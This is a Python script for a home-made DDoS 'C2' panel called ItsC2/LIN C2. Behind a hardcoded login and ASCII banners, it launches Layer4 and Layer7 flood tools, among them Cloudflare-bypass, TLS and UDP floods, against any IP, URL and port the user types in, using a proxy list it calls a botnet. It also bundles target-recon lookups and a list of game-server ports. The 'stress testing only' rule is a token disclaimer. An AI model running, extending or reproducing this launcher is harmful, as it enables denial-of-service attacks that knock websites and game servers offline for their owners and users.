##############################
# ItsC2 Homemade By Lintar #
# Owner: Lintar      #
# Staff: STR,Han.   #
##############################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

def ascii_vro():
    clear()
    print(f'''
    [ LOADING : 30%]
     / **/|        
     | ==         
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''


    [ LOADING : 50%]
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''






    [ LOADING : 70%]
     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
 COMPLETED 
    """)
    time.sleep(0.8)
    clear()

def si():
    print('         [ \x1b[38;2;233;233;233mLIN] | \x1b[38;2;233;233;233mWelcome to LIN PN! | \x1b[38;2;233;233;233mOwner: LINTAR   | \x1b[38;2;233;233;233mUpdate v2.0  ')
    print("")

def tools():
    clear()
    si()
    print(f'''
    TOOLS || LIST
    • geoip
    • reverseip
    • subnet-lookup
    • asn-lookup
    • dns-lookup
    • reverse-dns
''')
    
def banners():
    clear()
    si()
    print(f'''
    BANNERS || LIST
    • troll
    • pikachu
''')

def layer4():
    clear()
    si()
    print(f'''
    LAYER4 || LIST
    • paping
    • UDPBYPASS
    • ovh-raw
    • ovh-beam
    • tcp
    • HOLD
    • idap
    • stress
''')

def layer7():
    clear()
    si()
    print(f'''
    LAYER7 || LIST
    • hulkv1
    • STRV3
    • STRV4
    • nuke
    • POWER
    • lol 
    • raw-flood
    • BOOMBER
    • HTTP-STROM
    • tlsv1
    • tlsv2
    • tlsv3
    • attack
    • BROWSER
    • TLS-BYPASS
    • CF-UAM
''')


def rules():
    clear()
    si()
    print(f'''
                ║ RULES || LIST
                ║ 2. Do not attack  go.id ac.id domains  ║
                ║ 4. Only attack stress testing servers         ║
                ║ 5. Don't skid the panel                       ║
                ║ 6. Give a star to the github repository       ║
                ║ 7. The creator does not do any harm           ║
''')

def ports():
    clear()
    si()
    print(f'''
    PORTS || LIST
    21. SFTP
    22. SSH
    23. telnet
    25.SMTP
    53.DNS
    25.MINECRAFT
    69.FTTP
    80.HTTP
    443.HTTPS
    3074.XBOX
    5060.PLAYSATION
    25565.MINECRAFT
    5060.RIP
    30120. FIVEM
''')

def LINC2():
    clear()
    si()
    print(f'''
    ItsC2 || List
    • LIN1
    • LIN2
    • LIN3
    • Its
''')

def menu():
    sys.stdout.write(f"         \x1b]2;LIN C2 --> Botnet: {bots} | Online Users: [2-100] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print("[ \x1b[38;2;233;233;233mLIN ] | \x1b[38;2;233;233;233mWelcome to LIN C2! | \x1b[38;2;233;233;233mOwner: LINTAR  | \x1b[38;2;233;233;233mBotnet:" + str(bots) + "")
    print("")
    print("""
 ██▓▄▄▄█████▓  ██████  ▄████▄  
▓██▒▓  ██▒ ▓▒▒██    ▒ ▒██▀ ▀█  
▒██▒▒ ▓██░ ▒░░ ▓██▄   ▒▓█    ▄ 
░██░░ ▓██▓ ░   ▒   ██▒▒▓▓▄ ▄██▒
░██░  ▒██▒ ░ ▒██████▒▒▒ ▓███▀ ░
░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░
 ▒ ░    ░    ░ ░▒  ░ ░  ░  ▒   
 ▒ ░  ░      ░  ░  ░  ░        
 ░                 ░  ░ ░      
                      ░        
                      
Note: If you don't find the method you entered, try rewriting it in all capital letters

Type 'Help' to display the menu
""")

def main():
    menu()
    while(True):
        cnc = input('''LintarC2\n =>''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "Itsc2" or cnc == "ITSC2" or cnc == "ItsC2" or cnc == "itsc2":
            LINC2()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

# LAYER 4 METHODS   

        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
                
   
        elif "paping" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'python3 paping.py {ip} {port}')
            except IndexError:
                print('Usage: paping <ip> <port>')
                print('Example: paping 1.1.1.1 443 120')
        

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')
                
# DDOSC2 METHODS

        elif "LIN1" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run STR.go -site {url} -data {method}')
            except IndexError:
                print('Usage: LIN1 <url> METHODS<GET/POST>')
                print('Example: LIN1 http://example.com GET')
                
        elif "LIN2" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python2 STR.py {url}  ')
            except IndexError:
                print('Usage: LIN2 <url> ')
                print('Example: LIN2 http://example.com ')
                
       
        elif "LIN3" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python3 flood.py {url}')
            except IndexError:
                print('Usage: flood <url>')
                print('Example: flood http://example.com')
               
        elif "Its" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'node ItsC2.js{url}')
            except IndexError:
                print('Usage: node ItsC2 <target> <time> <requestIP> <threads> <host>')
               
               

# AMP/GAMES METHODS

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')
                
        elif "HTTPS-STORM" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'go run HTTPS-STORM.go {url} {port} {time}')
            except IndexError:
                print('Usage: HTTPS-STORM <url> <port> <time>')
                print('Example: HTTPS-STORM https://xxx.com/ 443 300')
                
        elif "HOLD" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'go run HOLD.go {url} {port} {time}')
            except IndexError:
                print('Usage: HOLD <url> <port> <time>')
                print('Example: HOLD https://xxx.com/ 443 300')
     
        elif "UDPBYPASS" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: UDPBYPASS <ip> <port>')
                print('Example: UDPBYPASS 1.1.1.1 80')
      
                
        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
         

# LAYER 7 METHODS
 
        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')



        elif "STRV4" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: STRV4 <url> <threads> METHODS<GET/POST> <time>')
                print('Example: STRV4 http://example.com 15000 get 60')
             

        elif "tlsv1" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node TLSV3.js {url} {time} {req_per_ip}')
            except IndexError:
                print('Usage: tlsv1 <url> <time> <req_per_ip>')
                print('Example: tlsv1 http://example.com 60 150')
                
        elif "TLS-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node TLS-BYPASS.js {url} {time} {req_per_ip}')
            except IndexError:
                print('Usage: TLS-BYPASS <url> <time> <req_per_ip>')
                print('Example: TLS-BYPASS http://example.com 60 150')
                
        elif "BROWSER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req_per_ip = cnc.split()[3]
                os.system(f'node BROWSER.js {url} {time} {req_per_ip}')
            except IndexError:
                print('Usage: BROWSER <url> <time> <req_per_ip>')
                print('Example: BROWSER http://example.com 60 150')          
                
        elif "tlsv2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                request = cnc.split()[4]
                os.system(f'node tlsv2.js {url} {time} {thread} {request} proxy.txt')
            except IndexError:
                print('Usage: tlsv2 <url> <time> <thread> <request>')
                print('Example: tlsv2 http://example.com 120 95500 512 ')
      
        elif "tlsv3" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node tlsv5.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: tlsv3 <url> <time> <rps> <thread>')
                print('Example: tlsv3 example.com 60 512 95500')
## 
        elif "nuke" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node Nuke.js {url} {time} 50 proxy.txt 100')
            except IndexError:
                print('Usage: nuke <url> <time>')
                print('Example: nuke http://example.com 100')
                
        elif "CF-UAM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node CF-UAM.js {url} {time} 50 proxy.txt 100')
            except IndexError:
                print('Usage: CF-UAM <url> <time>')
                print('Example: CF-UAM http://example.com 100')
                
        elif "raw-flood" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python3 fawflood.py {url}')
            except IndexError:
                print("Usage: python3 rawflood.py <ip> <port> <duration>")
                print("Example: python3 rawflood.py 1.1.1.1 80 60")
                   
        elif "attack" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node attack.js {url} {time} {threads}')
            except IndexError:
                print('Usage: attack <url> <time> <threads>')
                print('Example: attack http://example.com 100 9550')
                
        elif "lol" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                req_per_sec = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'node lol.js {url} {threads} {req_per_sec} {time}')
            except IndexError:
                print('Usage: lol <url> <threads> <req_per_sec> <time>')
                print('Example: lol http://example.com 99550 512 120')          
              
        elif "BOOMBER" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                req_per_sec = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'node BOOMBER.js {url} {threads} {req_per_sec} {time}')
            except IndexError:
                print('Usage: BOOMBER <url> <threads> <req_per_sec> <time>')
                print('Example: BOOMBER http://example.com 995 512 120')         

        elif "STRV3" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node flooder.js {url} {time} 50 proxy.txt 100 5')
            except IndexError:
                print('Usage: STRV3 <url> <time>')
                print('Example: STRV3 http://example.com 100')
                
                        
        elif "POWER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node POWERFUL.js {url} {time} {thread} ssl.txt')
            except IndexError:
                print('Usage: POWER <url> <time> <thread>')
                print('Example: POWER http://example.com 100 95500')
                
       
        elif "hulkv1" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Low.go -site {url} -data {method}')
            except IndexError:
                print('Usage: hulkv1 <url> METHODS<GET/POST>')
                print('Example: hulkv1 http://example.com GET/POST')
                


# BANNERS

        elif "troll" in cnc:
                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')

        elif "pikachu" in cnc:
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')

                
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER4  ► SHOW  METHODS
LAYER7  ► SHOW  METHODS
AMP     ► SHOW AMP METHODS
ITSC2 ► SHOW LINC2 METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "Lintar"
    passwd = "22"
    username = input("Username: ")
    password = getpass.getpass(prompt='Username: ')
    if username != user or password != passwd:
        print("")
        print("OOPS, THE PASSWORD IS WRONG!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Hello Welcome Back Again,[Lintar]")
        time.sleep(0.9)
        ascii_vro()
        main()

login()
